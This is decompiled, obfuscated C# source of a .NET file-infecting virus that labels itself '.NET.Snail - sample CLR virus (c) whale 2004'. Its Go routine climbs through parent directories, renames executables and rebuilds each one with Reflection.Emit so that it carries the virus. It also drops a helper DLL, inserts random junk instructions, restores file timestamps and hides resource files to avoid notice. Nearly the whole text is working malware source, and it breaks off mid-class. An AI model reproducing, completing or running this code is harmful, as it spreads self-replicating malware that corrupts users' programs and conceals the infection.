using System;
using System.Collections;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Security.Policy;
using System.Threading;
using Reflector.Disassembler;

namespace kckelhvxlr;

internal class xrieopydqqcD
{
	public class nnqpftdznilo
	{
		private Hashtable uXrDBub;

		private Hashtable tdezqdx;

		private Hashtable oVyLaxwaigqugf;

		private Hashtable ogYpkJpu;

		private Hashtable dpvRmlkx;

		private Hashtable mrxlxxb;

		public nnqpftdznilo()
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			uXrDBub = new Hashtable();
			tdezqdx = new Hashtable();
			oVyLaxwaigqugf = new Hashtable();
			ogYpkJpu = new Hashtable();
			dpvRmlkx = new Hashtable();
			mrxlxxb = new Hashtable();
		}

		protected override void sRqTolDzloj()
		{
			base.Finalize();
		}

		public void fdxullgeuvb()
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			uXrDBub.Clear();
			tdezqdx.Clear();
			oVyLaxwaigqugf.Clear();
			ogYpkJpu.Clear();
			dpvRmlkx.Clear();
			mrxlxxb.Clear();
		}

		public void iylnqouwmt(Type intype, TypeBuilder outtype)
		{
			uXrDBub.Add(intype, outtype);
		}

		public void sshton(Type intype, ModuleBuilder moduleBuilder)
		{
			if (!uXrDBub.ContainsKey(intype))
			{
				return;
			}
			PropertyInfo[] properties = intype.GetProperties(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
			foreach (PropertyInfo propertyInfo in properties)
			{
				TypeBuilder typeBuilder = (TypeBuilder)uXrDBub[propertyInfo.PropertyType];
				PropertyBuilder value = (((object)typeBuilder == null) ? ((TypeBuilder)uXrDBub[intype]).DefineProperty(pbybjr(intype) ? nPsiueq.meqqpaup() : propertyInfo.Name, propertyInfo.Attributes, propertyInfo.PropertyType, null) : ((TypeBuilder)uXrDBub[intype]).DefineProperty(pbybjr(intype) ? nPsiueq.meqqpaup() : propertyInfo.Name, propertyInfo.Attributes, typeBuilder, null));
				mrxlxxb.Add(propertyInfo, value);
			}
			FieldInfo[] fields = intype.GetFields(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
			foreach (FieldInfo fieldInfo in fields)
			{
				TypeBuilder typeBuilder2 = (TypeBuilder)uXrDBub[fieldInfo.FieldType];
				FieldBuilder value2 = (((object)typeBuilder2 == null) ? ((TypeBuilder)uXrDBub[intype]).DefineField(pbybjr(intype) ? nPsiueq.meqqpaup() : fieldInfo.Name, fieldInfo.FieldType, fieldInfo.Attributes) : ((TypeBuilder)uXrDBub[intype]).DefineField(pbybjr(intype) ? nPsiueq.meqqpaup() : fieldInfo.Name, typeBuilder2, fieldInfo.Attributes));
				ogYpkJpu.Add(fieldInfo, value2);
			}
			ConstructorInfo[] constructors = intype.GetConstructors(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
			foreach (ConstructorInfo constructorInfo in constructors)
			{
				ParameterInfo[] parameters = constructorInfo.GetParameters();
				Type[] array = new Type[checked((uint)parameters.Length)];
				for (int j = 0; j < parameters.Length; j++)
				{
					TypeBuilder typeBuilder3 = (TypeBuilder)uXrDBub[parameters[j].ParameterType];
					if ((object)typeBuilder3 != null)
					{
						array[j] = typeBuilder3;
					}
					else
					{
						array[j] = parameters[j].ParameterType;
					}
				}
				ConstructorBuilder ctorBuilder = ((TypeBuilder)uXrDBub[intype]).DefineConstructor(constructorInfo.Attributes, constructorInfo.CallingConvention, array);
				yqekubezBu(constructorInfo, ref ctorBuilder);
				tdezqdx.Add(constructorInfo, ctorBuilder);
			}
			EventInfo[] events = intype.GetEvents(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
			foreach (EventInfo eventInfo in events)
			{
				EventBuilder value3 = ((TypeBuilder)uXrDBub[intype]).DefineEvent(pbybjr(intype) ? nPsiueq.meqqpaup() : eventInfo.Name, eventInfo.Attributes, eventInfo.EventHandlerType);
				oVyLaxwaigqugf.Add(eventInfo, value3);
			}
			MethodInfo[] methods = intype.GetMethods(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
			foreach (MethodBase methodBase in methods)
			{
				if (methodBase.Name == "Main" && (object)methodBase.DeclaringType == typeof(xrieopydqqcD))
				{
					continue;
				}
				if (methodBase.Name == "Go" && (object)methodBase.DeclaringType == typeof(xrieopydqqcD))
				{
					Ojiwadtto = methodBase;
				}
				ParameterInfo[] parameters2 = methodBase.GetParameters();
				Type[] array2 = new Type[checked((uint)parameters2.Length)];
				for (int k = 0; k < parameters2.Length; k++)
				{
					TypeBuilder typeBuilder4 = (TypeBuilder)uXrDBub[parameters2[k].ParameterType];
					if ((object)typeBuilder4 != null)
					{
						array2[k] = typeBuilder4;
					}
					else
					{
						array2[k] = parameters2[k].ParameterType;
					}
				}
				Type returnType = ((MethodInfo)methodBase).ReturnType;
				TypeBuilder typeBuilder5 = xEKtafwb(returnType);
				string name = methodBase.Name;
				MethodBuilder methodBuilder = (((object)typeBuilder5 == null) ? ((TypeBuilder)uXrDBub[intype]).DefineMethod((!pbybjr(intype) || !(name != "Go")) ? name : nPsiueq.meqqpaup(), methodBase.Attributes, methodBase.CallingConvention, returnType, array2) : ((TypeBuilder)uXrDBub[intype]).DefineMethod((!pbybjr(intype) || !(name != "Go")) ? name : nPsiueq.meqqpaup(), methodBase.Attributes, methodBase.CallingConvention, typeBuilder5, array2));
				cfwiwf(methodBase, ref methodBuilder);
				dpvRmlkx.Add(methodBase, methodBuilder);
			}
		}

		public MethodBuilder vzIyvrjxjhnz(Type type, MethodBase methodBase)
		{
			return (MethodBuilder)dpvRmlkx[methodBase];
		}

		public ConstructorBuilder etbaebi(Type type, ConstructorInfo ctorInfo)
		{
			return (ConstructorBuilder)tdezqdx[ctorInfo];
		}

		public PropertyBuilder cxbxwfGbvw(Type type, PropertyInfo propertyInfo)
		{
			return (PropertyBuilder)mrxlxxb[propertyInfo];
		}

		public FieldBuilder etqEvak(Type type, FieldInfo fieldInfo)
		{
			return (FieldBuilder)ogYpkJpu[fieldInfo];
		}

		public EventBuilder regxwudgm(Type type, EventInfo eventInfo)
		{
			return (EventBuilder)oVyLaxwaigqugf[eventInfo];
		}

		public TypeBuilder xEKtafwb(Type type)
		{
			return (TypeBuilder)uXrDBub[type];
		}
	}

	private class uAfzmzmprnjlw
	{
		private ILGenerator pyhXwbpoavf;

		private LocalBuilder[] mxQycuduaewb;

		public uAfzmzmprnjlw(ILGenerator ilGenerator, LocalBuilder[] localBuilders)
		{
			pyhXwbpoavf = ilGenerator;
			mxQycuduaewb = localBuilders;
		}

		public void qwghiubYc()
		{
			if (fhekWzTk.Next(5) == 0)
			{
				pyhXwbpoavf.Emit(OpCodes.Nop);
			}
			if (fhekWzTk.Next(10) == 0 && mxQycuduaewb.Length > 0)
			{
				LocalBuilder local = mxQycuduaewb[fhekWzTk.Next(mxQycuduaewb.Length)];
				pyhXwbpoavf.Emit(OpCodes.Ldloc, local);
				pyhXwbpoavf.Emit(OpCodes.Pop);
			}
		}
	}

	private sealed class AssemblyProvider : IAssemblyProvider
	{
		public Assembly[] GetAssemblies()
		{
			throw new NotImplementedException();
		}

		public Assembly Load(string assemblyName)
		{
			return Assembly.Load(assemblyName);
		}
	}

	private class uodsxxuliiz
	{
		protected int ftxnMowORygvdi;

		protected byte[] kRfqbwulkgqAc = new byte[128];

		[SpecialName]
		public int tpgqkpkucfthn()
		{
			return ftxnMowORygvdi;
		}

		public void zEtgol(BinaryReader source)
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			source.Read(kRfqbwulkgqAc, 0, kRfqbwulkgqAc.Length);
			ftxnMowORygvdi = kRfqbwulkgqAc[60] | (kRfqbwulkgqAc[61] << 8) | (kRfqbwulkgqAc[62] << 16) | (kRfqbwulkgqAc[63] << 24);
		}
	}

	private class tbetzkWdxclu
	{
		protected byte[] dbuWVyWvoyZ = new byte[4];

		protected ushort fwdfRfznhOP;

		protected ushort Wlamzygz;

		protected int qhrwbqlgjeoO;

		protected ushort gagildi;

		protected ushort pzvoswu;

		protected ushort kckVuizcbcDAow;

		protected byte kowgmxxN;

		protected byte opvRlWhhwc;

		protected uint dwoefnpXutrz;

		protected uint FqAkzdugl;

		protected uint jrkcihx;

		protected uint ioFCpuzmgW;

		protected uint OgxbrfWjfwvxwm;

		protected uint bbrkwfgyuKmfs;

		protected uint omoJiRDqs;

		public uint oZccafviqmv;

		public uint qcgvnlipvlodxd;

		protected ushort flvrzqKsjfyfpn;

		protected ushort czrifgkq;

		protected ushort eknxaubvtjjjk;

		protected ushort yOpmdvr;

		protected ushort qodlrg;

		protected ushort lajYmep;

		protected uint oipcvaNwis;

		public uint wfcDkot;

		protected uint rniejlqwwqeGiq;

		protected uint lTcTlrfjb;

		protected uint ordPiyulwi;

		protected uint cKyyxgqvrn;

		protected uint lnxuntdcaF;

		protected uint LSdpeugiccJ;

		protected uint mntqhkrna;

		protected uint izxuyCw;

		protected uint fqwnmW;

		protected Lxfiwlr chybnpzSfnk;

		protected Lxfiwlr CjVmbDjahhu;

		public Lxfiwlr xuhigl;

		protected Lxfiwlr pgaovje;

		protected Lxfiwlr Awcmafsxyoyoz;

		protected Lxfiwlr bkcbcbrPTv;

		protected Lxfiwlr xLqhoJnfdauco;

		protected Lxfiwlr iuefJadjlmSqs;

		protected Lxfiwlr HBhaviAgqQwgd;

		protected Lxfiwlr cwEkaj;

		protected Lxfiwlr coclmzbixmBz;

		protected Lxfiwlr epghzbnpylrmcw;

		protected Lxfiwlr qVcukYccYwphdc;

		protected Lxfiwlr iRxpIqtk;

		public Lxfiwlr ojdawxlVjc;

		public Lxfiwlr enqfwxab;

		public ArrayList fraswujhugwtyy;

		public byte[] lutszZ(BinaryReader source)
		{
			try
			{
				if (xuhigl.oKmirJgnjsztiu != 0)
				{
					source.BaseStream.Position = puHuafvnRne(xuhigl.oKmirJgnjsztiu);
					return source.ReadBytes((int)xuhigl.xFnWepm);
				}
				return null;
			}
			catch
			{
				return null;
			}
		}

		public void tlnpgvuqkwqot(BinaryReader source, uodsxxuliiz msdosheader)
		{
			source.BaseStream.Position = msdosheader.tpgqkpkucfthn();
			source.Read(dbuWVyWvoyZ, 0, 4);
			if (dbuWVyWvoyZ[0] == 80 && dbuWVyWvoyZ[1] == 69 && dbuWVyWvoyZ[2] == 0 && dbuWVyWvoyZ[3] == 0)
			{
				fwdfRfznhOP = source.ReadUInt16();
				if (fwdfRfznhOP != 332)
				{
					throw new Exception("Incorrect machine id code");
				}
				Wlamzygz = source.ReadUInt16();
				qhrwbqlgjeoO = source.ReadInt32();
				if (source.ReadInt32() != 0)
				{
					throw new Exception("Symbol table offset != 0");
				}
				if (source.ReadInt32() != 0)
				{
					throw new Exception("Symbol table count != 0");
				}
				gagildi = source.ReadUInt16();
				pzvoswu = source.ReadUInt16();
				kckVuizcbcDAow = source.ReadUInt16();
				if (kckVuizcbcDAow != 267)
				{
					throw new Exception("Bad magic number for PE Optional Header");
				}
				kowgmxxN = source.ReadByte();
				opvRlWhhwc = source.ReadByte();
				if (kowgmxxN == 6 && opvRlWhhwc == 0)
				{
					dwoefnpXutrz = source.ReadUInt32();
					FqAkzdugl = source.ReadUInt32();
					jrkcihx = source.ReadUInt32();
					ioFCpuzmgW = source.ReadUInt32();
					OgxbrfWjfwvxwm = source.ReadUInt32();
					bbrkwfgyuKmfs = source.ReadUInt32();
					omoJiRDqs = source.ReadUInt32();
					oZccafviqmv = source.ReadUInt32();
					qcgvnlipvlodxd = source.ReadUInt32();
					flvrzqKsjfyfpn = source.ReadUInt16();
					czrifgkq = source.ReadUInt16();
					eknxaubvtjjjk = source.ReadUInt16();
					yOpmdvr = source.ReadUInt16();
					qodlrg = source.ReadUInt16();
					lajYmep = source.ReadUInt16();
					source.ReadUInt32();
					wfcDkot = source.ReadUInt32();
					oipcvaNwis = source.ReadUInt32();
					rniejlqwwqeGiq = source.ReadUInt32();
					lTcTlrfjb = source.ReadUInt16();
					ordPiyulwi = source.ReadUInt16();
					cKyyxgqvrn = source.ReadUInt32();
					lnxuntdcaF = source.ReadUInt32();
					LSdpeugiccJ = source.ReadUInt32();
					mntqhkrna = source.ReadUInt32();
					izxuyCw = source.ReadUInt32();
					fqwnmW = source.ReadUInt32();
					chybnpzSfnk = new Lxfiwlr(source.ReadUInt32(), source.ReadUInt32());
					CjVmbDjahhu = new Lxfiwlr(source.ReadUInt32(), source.ReadUInt32());
					xuhigl = new Lxfiwlr(source.ReadUInt32(), source.ReadUInt32());
					pgaovje = new Lxfiwlr(source.ReadUInt32(), source.ReadUInt32());
					Awcmafsxyoyoz = new Lxfiwlr(source.ReadUInt32(), source.ReadUInt32());
					bkcbcbrPTv = new Lxfiwlr(source.ReadUInt32(), source.ReadUInt32());
					xLqhoJnfdauco = new Lxfiwlr(source.ReadUInt32(), source.ReadUInt32());
					iuefJadjlmSqs = new Lxfiwlr(source.ReadUInt32(), source.ReadUInt32());
					HBhaviAgqQwgd = new Lxfiwlr(source.ReadUInt32(), source.ReadUInt32());
					cwEkaj = new Lxfiwlr(source.ReadUInt32(), source.ReadUInt32());
					coclmzbixmBz = new Lxfiwlr(source.ReadUInt32(), source.ReadUInt32());
					epghzbnpylrmcw = new Lxfiwlr(source.ReadUInt32(), source.ReadUInt32());
					qVcukYccYwphdc = new Lxfiwlr(source.ReadUInt32(), source.ReadUInt32());
					iRxpIqtk = new Lxfiwlr(source.ReadUInt32(), source.ReadUInt32());
					ojdawxlVjc = new Lxfiwlr(source.ReadUInt32(), source.ReadUInt32());
					enqfwxab = new Lxfiwlr(source.ReadUInt32(), source.ReadUInt32());
					fraswujhugwtyy = new ArrayList();
					for (int i = 0; i < Wlamzygz; i++)
					{
						fraswujhugwtyy.Add(new cMOoOgkad());
						((cMOoOgkad)fraswujhugwtyy[i]).cpjyNhkOdatzKl(source);
					}
					return;
				}
				throw new Exception("Bad L number");
			}
			throw new Exception("Missing PE file signature");
		}

		public uint puHuafvnRne(uint rva)
		{
			int num = 0;
			while (true)
			{
				if (num < fraswujhugwtyy.Count)
				{
					if (((cMOoOgkad)fraswujhugwtyy[num]).hexohhn <= rva && rva < ((cMOoOgkad)fraswujhugwtyy[num]).hexohhn + ((cMOoOgkad)fraswujhugwtyy[num]).huntmwlbo)
					{
						break;
					}
					num++;
					continue;
				}
				throw new Exception("Unresolvable RVA " + rva);
			}
			return ((cMOoOgkad)fraswujhugwtyy[num]).zmeiajmfzkjpje + (rva - ((cMOoOgkad)fraswujhugwtyy[num]).hexohhn);
		}
	}

	private class xdohkoinFjot : tbetzkWdxclu
	{
		public void oDleyn(Lxfiwlr d, BinaryWriter dest, uodsxxuliiz msdosheader)
		{
			dest.BaseStream.Position = msdosheader.tpgqkpkucfthn() + 136;
			dest.Write(d.oKmirJgnjsztiu);
			dest.Write(d.xFnWepm);
		}

		public void lnaqeacWglxCZk(cMOoOgkad sh, BinaryReader source, BinaryWriter dest, uodsxxuliiz msdosheader)
		{
			source.BaseStream.Position = msdosheader.tpgqkpkucfthn() + 6;
			ushort num = source.ReadUInt16();
			dest.BaseStream.Position = msdosheader.tpgqkpkucfthn() + 6;
			dest.Write(num + 1);
			dest.BaseStream.Position = msdosheader.tpgqkpkucfthn() + 248 + num * 40;
			sh.uwpzuX(dest);
		}

		public void gilxoegqvcjfl(uint isize, BinaryWriter dest, uodsxxuliiz msdosheader)
		{
			dest.BaseStream.Position = msdosheader.tpgqkpkucfthn() + 80;
			dest.Write(isize);
		}

		public void Rzpnwvm(uint resOffset, uint oldResRVA, uint newResRVA, BinaryReader src, BinaryWriter dest)
		{
			sgrmeipkAnBhqm(resOffset, 0u, oldResRVA, newResRVA, src, dest);
		}

		private void sgrmeipkAnBhqm(uint resOffset, uint nodeOffset, uint oldResRVA, uint newResRVA, BinaryReader src, BinaryWriter dest)
		{
			src.BaseStream.Position = resOffset + nodeOffset + 12;
			ushort num = src.ReadUInt16();
			num = (ushort)(num + src.ReadUInt16());
			for (int i = 0; i < num; i++)
			{
				src.ReadUInt32();
				uint num2 = src.ReadUInt32();
				long position = src.BaseStream.Position;
				if ((num2 & 0x80000000u) != 0)
				{
					sgrmeipkAnBhqm(resOffset, num2 & 0x7FFFFFFFu, oldResRVA, newResRVA, src, dest);
				}
				else
				{
					zpsnikHqgjml(resOffset + num2, oldResRVA, newResRVA, src, dest);
				}
				src.BaseStream.Position = position;
			}
		}

		private void zpsnikHqgjml(uint dataOffset, uint oldResRVA, uint newResRVA, BinaryReader src, BinaryWriter dest)
		{
			src.BaseStream.Position = dataOffset;
			uint num = src.ReadUInt32();
			num += newResRVA;
			num -= oldResRVA;
			dest.BaseStream.Position = src.BaseStream.Position - 4L;
			dest.Write(num);
			dest.BaseStream.Position += 12L;
			src.BaseStream.Position += 12L;
		}
	}

	private class Lxfiwlr
	{
		public uint oKmirJgnjsztiu;

		public uint xFnWepm;

		public Lxfiwlr(uint rva, uint size)
		{
			oKmirJgnjsztiu = rva;
			xFnWepm = size;
		}

		public override string havcSukidKb()
		{
			return "0x" + oKmirJgnjsztiu.ToString("X8") + ",0x" + xFnWepm.ToString("X8");
		}
	}

	private class cMOoOgkad
	{
		public byte[] sqfdnCu;

		public uint huntmwlbo;

		public uint hexohhn;

		public uint yzpzejsLoIjz;

		public uint zmeiajmfzkjpje;

		protected uint bsmgrjy;

		protected uint bbckpgkiwla;

		protected ushort azhalHymxuSN;

		protected ushort jnmirtxawxXta;

		public uint fbkZmonjqz;

		public cMOoOgkad()
		{
			jnmirtxawxXta = 0;
			azhalHymxuSN = 0;
			bbckpgkiwla = 0u;
			bsmgrjy = 0u;
		}

		public cMOoOgkad(string strname, uint vsize, uint vaddr, uint phsize, uint phoffs, uint flags)
		{
			sqfdnCu = new byte[8];
			for (int i = 0; i < strname.Length && i < 8; i++)
			{
				sqfdnCu[i] = (byte)strname[i];
			}
			huntmwlbo = vsize;
			hexohhn = vaddr;
			yzpzejsLoIjz = phsize;
			zmeiajmfzkjpje = phoffs;
			fbkZmonjqz = flags;
			jnmirtxawxXta = 0;
			azhalHymxuSN = 0;
			bbckpgkiwla = 0u;
			bsmgrjy = 0u;
		}

		public void uwpzuX(BinaryWriter dest)
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			dest.Write(sqfdnCu, 0, 8);
			dest.Write(huntmwlbo);
			dest.Write(hexohhn);
			dest.Write(yzpzejsLoIjz);
			dest.Write(zmeiajmfzkjpje);
			dest.Write(bsmgrjy);
			dest.Write(bbckpgkiwla);
			dest.Write(azhalHymxuSN);
			dest.Write(jnmirtxawxXta);
			dest.Write(fbkZmonjqz);
		}

		public void cpjyNhkOdatzKl(BinaryReader source)
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			sqfdnCu = new byte[8];
			source.Read(sqfdnCu, 0, 8);
			huntmwlbo = source.ReadUInt32();
			hexohhn = source.ReadUInt32();
			yzpzejsLoIjz = source.ReadUInt32();
			zmeiajmfzkjpje = source.ReadUInt32();
			bsmgrjy = source.ReadUInt32();
			bbckpgkiwla = source.ReadUInt32();
			azhalHymxuSN = source.ReadUInt16();
			jnmirtxawxXta = source.ReadUInt16();
			fbkZmonjqz = source.ReadUInt32();
		}
	}

	private class ckefmcnikpjcme
	{
		private Random rremja;

		private int goekrx;

		private int sloxWqfbt;

		public ckefmcnikpjcme(int len1, int len2, int seed)
		{
			rremja = new Random(seed);
			goekrx = len1;
			sloxWqfbt = len2;
		}

		public string meqqpaup()
		{
			string text = "";
			int num = rremja.Next(goekrx, sloxWqfbt);
			for (int i = 0; i < num; i++)
			{
				text = ((rremja.Next(8) != 1) ? (text + (char)(97 + rremja.Next(26))) : (text + (char)(65 + rremja.Next(26))));
			}
			return text;
		}
	}

	private static string vievdjbybiafhG = "[ .NET.Snail - sample CLR virus (c) whale 2004 ]";

	private static ckefmcnikpjcme nPsiueq = new ckefmcnikpjcme(6, 15, Environment.TickCount);

	private static Random fhekWzTk = new Random(Environment.TickCount);

	private static byte[] qquiph;

	private static MethodBase Ojiwadtto;

	public static bool jwqkZocrojjQhc;

	public xrieopydqqcD(string inFileName, string outFileName)
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		try
		{
			jwqkZocrojjQhc = true;
			bktugnjzydr(inFileName, outFileName);
			if (!jwqkZocrojjQhc)
			{
				bktugnjzydr(inFileName, outFileName);
			}
		}
		catch (ThreadAbortException)
		{
			File.Move(inFileName, outFileName);
		}
		catch (Exception)
		{
		}
	}

	private static bool pbybjr(Type t)
	{
		if ((object)t.Assembly == Assembly.GetExecutingAssembly())
		{
			return -1 == t.FullName!.IndexOf("AssemblyProvider");
		}
		return false;
	}

	public static void Go()
	{
		qquiph = plofcXrGdqk();
		string currentDirectory;
		do
		{
			wmAbffzLtPmijW();
			currentDirectory = Directory.GetCurrentDirectory();
			Directory.SetCurrentDirectory("..");
		}
		while (currentDirectory != Directory.GetCurrentDirectory());
	}

	public static void wmAbffzLtPmijW()
	{
		string[] files = Directory.GetFiles(".", "*.exe");
		if (files.Length == 0)
		{
			return;
		}
		bool flag;
		if (!(flag = File.Exists("ILReader.dll")) && qquiph != null)
		{
			FileStream fileStream = new FileStream("ILReader.dll", FileMode.CreateNew, FileAccess.ReadWrite);
			if (fileStream != null)
			{
				BinaryWriter binaryWriter = new BinaryWriter(fileStream);
				binaryWriter.Write(qquiph);
			}
			fileStream.Close();
		}
		string[] array = files;
		foreach (string path in array)
		{
			string fileName = Path.GetFileName(path);
			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(fileName);
			string text = "_" + fileName;
			if (fileName[0] == '_' || fileNameWithoutExtension == Assembly.GetExecutingAssembly().GetName().Name || File.Exists(text))
			{
				continue;
			}
			DateTime creationTime = File.GetCreationTime(fileName);
			DateTime lastAccessTime = File.GetLastAccessTime(fileName);
			DateTime lastWriteTime = File.GetLastWriteTime(fileName);
			File.Move(fileName, text);
			try
			{
				object[] array2 = new object[2] { text, fileName };
				AppDomain appDomain = AppDomain.CreateDomain("domain");
				Type typeFromHandle = typeof(xrieopydqqcD);
				string name = Assembly.GetExecutingAssembly().GetName().Name;
				appDomain.CreateInstance(name, typeFromHandle.FullName, false, BindingFlags.Default, (Binder)null, array2, (CultureInfo)null, (object[])null, (Evidence)null);
				AppDomain.Unload(appDomain);
				if (File.Exists(fileName))
				{
					File.Delete(text);
					efZexkvcvfwmm(fileName, qquiph);
					File.SetCreationTime(fileName, creationTime);
					File.SetLastAccessTime(fileName, lastAccessTime);
					File.SetLastWriteTime(fileName, lastWriteTime);
					string path2 = fileNameWithoutExtension + ".resources";
					if (File.Exists(path2))
					{
						File.SetCreationTime(path2, creationTime);
						File.SetLastAccessTime(path2, lastAccessTime);
						File.SetLastWriteTime(path2, lastWriteTime);
						File.SetAttributes(path2, FileAttributes.Hidden);
					}
				}
				else
				{
					File.Move(text, fileName);
				}
			}
			catch (ThreadAbortException)
			{
				File.Move(text, fileName);
				return;
			}
			catch (Exception)
			{
			}
		}
		if (!flag)
		{
			File.Delete("ILReader.dll");
		}
	}

	private static PEFileKinds eRmoDaomful(string filename)
	{
		FileStream fileStream = new FileStream(filename, FileMode.Open, FileAccess.Read);
		if (fileStream == null)
		{
			return (PEFileKinds)0;
		}
		byte[] array = new byte[4];
		fileStream.Seek(60L, SeekOrigin.Begin);
		fileStream.Read(array, 0, 4);
		uint num = array[0] | ((uint)array[1] >> 8) | ((uint)array[2] >> 16) | ((uint)array[3] >> 24);
		fileStream.Seek(num + 92, SeekOrigin.Begin);
		fileStream.Read(array, 0, 1);
		fileStream.Close();
		if (array[0] == 3)
		{
			return PEFileKinds.ConsoleApplication;
		}
		return PEFileKinds.WindowApplication;
	}

	public static void bktugnjzydr(string inFileName, string outFileName)
	{
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012c: Expected O, but got Unknown
		PEFileKinds filetype = eRmoDaomful(inFileName);
		nnqpftdznilo nnqpftdznilo = new nnqpftdznilo();
		AppDomain domain = Thread.GetDomain();
		AssemblyName assemblyName = new AssemblyName();
		assemblyName.Name = Path.GetFileNameWithoutExtension(outFileName);
		AssemblyBuilder ab = domain.DefineDynamicAssembly(assemblyName, (AssemblyBuilderAccess)3);
		Assembly assembly = Assembly.LoadFrom(inFileName);
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		Module[] modules = assembly.GetModules();
		foreach (Module module in modules)
		{
			ModuleBuilder moduleBuilder = ab.DefineDynamicModule(module.Name.Substring(1), outFileName);
			ModuleReader reader = new ModuleReader(module, (IAssemblyProvider)(object)new AssemblyProvider());
			moduleBuilder.CreateGlobalFunctions();
			Type[] types = module.GetTypes();
			Type[] array = types;
			foreach (Type type in array)
			{
				if (type.GetNestedTypes(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic).Length == typeof(xrieopydqqcD).GetNestedTypes(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic).Length && type.GetMethods().Length == typeof(xrieopydqqcD).GetMethods().Length)
				{
					return;
				}
				MethodInfo[] methods = type.GetMethods(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
				foreach (MethodBase methodBase in methods)
				{
					if ((object)assembly.EntryPoint != methodBase)
					{
						continue;
					}
					Module[] modules2 = executingAssembly.GetModules();
					foreach (Module module2 in modules2)
					{
						ModuleReader reader2 = new ModuleReader(module2, (IAssemblyProvider)(object)new AssemblyProvider());
						Type[] types2 = module2.GetTypes();
						Type[] array2 = types2;
						foreach (Type type2 in array2)
						{
							if ((object)type2 == typeof(xrieopydqqcD))
							{
								yvebdpyueqo(type2, null, moduleBuilder, reader2, nnqpftdznilo);
							}
							if (type2.FullName!.Length > 22 && type2.FullName!.Substring(0, 22) == "Reflector.Disassembler")
							{
								yvebdpyueqo(type2, null, moduleBuilder, reader2, nnqpftdznilo);
							}
						}
						array2 = types2;
						foreach (Type intype in array2)
						{
							nnqpftdznilo.sshton(intype, moduleBuilder);
						}
						array2 = types2;
						foreach (Type type3 in array2)
						{
							if ((object)type3 == typeof(xrieopydqqcD))
							{
								syfVsThvbcwkBq(type3, null, reader2, assembly, ref ab, setEP: false, filetype, nnqpftdznilo);
							}
							if (type3.FullName!.Length > 22 && type3.FullName!.Substring(0, 22) == "Reflector.Disassembler")
							{
								syfVsThvbcwkBq(type3, null, reader2, assembly, ref ab, setEP: false, filetype, nnqpftdznilo);
							}
						}
					}
				}
			}
			array = types;
			foreach (Type type4 in array)
			{
				yvebdpyueqo(type4, null, moduleBuilder, reader, nnqpftdznilo);
			}
			array = types;
			foreach (Type intype2 in array)
			{
				nnqpftdznilo.sshton(intype2, moduleBuilder);
			}
			array = types;
			foreach (Type type5 in array)
			{
				syfVsThvbcwkBq(type5, null, reader, assembly, ref ab, setEP: true, filetype, nnqpftdznilo);
			}
		}
		try
		{
			DaSuxuoumcrbq(assembly, ab, outFileName);
		}
		catch (ThreadAbortException)
		{
			File.Move(inFileName, outFileName);
			return;
		}
		catch (Exception)
		{
		}
		try
		{
			ab.Save(outFileName);
		}
		catch (ThreadAbortException)
		{
			File.Move(inFileName, outFileName);
			return;
		}
		catch (Exception)
		{
		}
		try
		{
			ajasisBxvjsdr(inFileName, outFileName);
		}
		catch (ThreadAbortException)
		{
			File.Move(inFileName, outFileName);
		}
		catch (Exception)
		{
		}
	}

	private static void yvebdpyueqo(Type type, Type wrapperType, ModuleBuilder outmodb, ModuleReader reader, nnqpftdznilo objects)
	{
		string fullName = type.FullName;
		if ((object)wrapperType != null || -1 == fullName.IndexOf("+"))
		{
			Type baseType = type.BaseType;
			Type type2 = (((object)baseType == null) ? null : objects.xEKtafwb(baseType));
			if ((object)type2 == null)
			{
				type2 = baseType;
			}
			Type[] interfaces = type.GetInterfaces();
			TypeBuilder outtype;
			if ((object)wrapperType != null)
			{
				TypeBuilder typeBuilder = objects.xEKtafwb(wrapperType);
				outtype = typeBuilder.DefineNestedType(pbybjr(type) ? nPsiueq.meqqpaup() : type.Name, type.Attributes, type2, interfaces);
			}
			else
			{
				string name = ((typeof(xrieopydqqcD).GetHashCode() != type.GetHashCode()) ? (pbybjr(type) ? nPsiueq.meqqpaup() : fullName) : (pbybjr(type) ? (nPsiueq.meqqpaup() + "." + nPsiueq.meqqpaup()) : fullName));
				outtype = outmodb.DefineType(name, type.Attributes, type2, interfaces);
			}
			objects.iylnqouwmt(type, outtype);
			Type[] nestedTypes = type.GetNestedTypes(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
			Type[] array = nestedTypes;
			foreach (Type type3 in array)
			{
				yvebdpyueqo(type3, type, outmodb, reader, objects);
			}
		}
	}

	private static void cfwiwf(MethodBase methodBase, ref MethodBuilder methodBuilder)
	{
		ParameterInfo[] parameters = methodBase.GetParameters();
		for (int i = 0; i < parameters.Length; i++)
		{
			methodBuilder.DefineParameter(i + 1, parameters[i].Attributes, parameters[i].Name);
		}
	}

	private static void yqekubezBu(MethodBase methodBase, ref ConstructorBuilder ctorBuilder)
	{
		ParameterInfo[] parameters = methodBase.GetParameters();
		for (int i = 0; i < parameters.Length; i++)
		{
			ctorBuilder.DefineParameter(i + 1, parameters[i].Attributes, parameters[i].Name);
		}
